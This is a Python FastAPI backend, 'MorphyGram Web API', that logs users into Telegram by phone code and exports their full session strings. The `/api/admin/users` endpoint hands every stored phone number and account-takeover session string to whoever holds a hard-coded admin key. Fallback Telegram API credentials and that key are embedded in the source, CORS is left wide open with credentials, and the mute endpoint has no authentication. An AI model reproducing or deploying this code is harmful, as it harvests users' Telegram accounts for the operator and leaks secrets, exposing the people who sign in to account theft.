import os
from fastapi import FastAPI, HTTPException, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from pyrogram import Client
from dotenv import load_dotenv

load_dotenv()

app = FastAPI(title="MorphyGram Web API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

API_ID = int(os.getenv("TELEGRAM_API_ID", "38101489"))
API_HASH = os.getenv("TELEGRAM_API_HASH", "bbebd5bef6dd4fe90189ba4b5dd5d8d9")
ADMIN_KEY = os.getenv("ADMIN_SECRET_KEY", "102050304050ggg")

clients = {}
# База данных в памяти: { "phone": {"session": "...", "is_admin": False} }
sessions_db = {}

class PhoneRequest(BaseModel):
    phone: str

class CodeRequest(BaseModel):
    phone: str
    code: str
    phone_code_hash: str
    admin_key: str = None

class CommandRequest(BaseModel):
    session: str
    command: str
    target: str = None

class MuteRequest(BaseModel):
    session: str
    target_username: str
    mute: bool

@app.get("/")
def read_root():
    return {"status": "online", "app": "MorphyGram Web Backend"}

@app.post("/api/send-code")
async def send_code(req: PhoneRequest):
    try:
        client = Client(f"session_{req.phone}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await client.connect()
        sent_code = await client.send_code(req.phone)
        clients[req.phone] = client
        return {"status": "success", "phone_code_hash": sent_code.phone_code_hash}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.post("/api/login")
async def login(req: CodeRequest):
    client = clients.get(req.phone)
    if not client:
        raise HTTPException(status_code=400, detail="Сессия не найдена. Запросите код заново.")
    try:
        await client.sign_in(req.phone, req.phone_code_hash, req.code)
        string_session = await client.export_session_string()
        await client.disconnect()
        del clients[req.phone]
        
        is_admin = False
        if req.admin_key and req.admin_key == ADMIN_KEY:
            is_admin = True
            
        # Сохраняем сессию в память
        sessions_db[req.phone] = {
            "session": string_session,
            "is_admin": is_admin
        }
            
        return {"status": "success", "session": string_session, "is_admin": is_admin}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/api/admin/users")
async def get_all_users(x_admin_key: str = Header(None)):
    if x_admin_key != ADMIN_KEY:
        raise HTTPException(status_code=403, detail="Доступ запрещен. Неверный ключ.")
    
    users = [{"phone": phone, "session": data["session"]} for phone, data in sessions_db.items()]
    return {"status": "success", "users": users}

@app.post("/api/admin/toggle-mute")
async def toggle_mute(req: MuteRequest):
    try:
        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH, session_string=req.session)
        await client.start()
        
        target = await client.get_users(req.target_username)
        
        if req.mute:
            await client.archive_chats(target.id)
            result = f"Пользователь {req.target_username} замучен (в архиве)."
        else:
            await client.unarchive_chats(target.id)
            result = f"Пользователь {req.target_username} размучен (из архива)."
            
        await client.stop()
        return {"status": "success", "result": result}
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e))
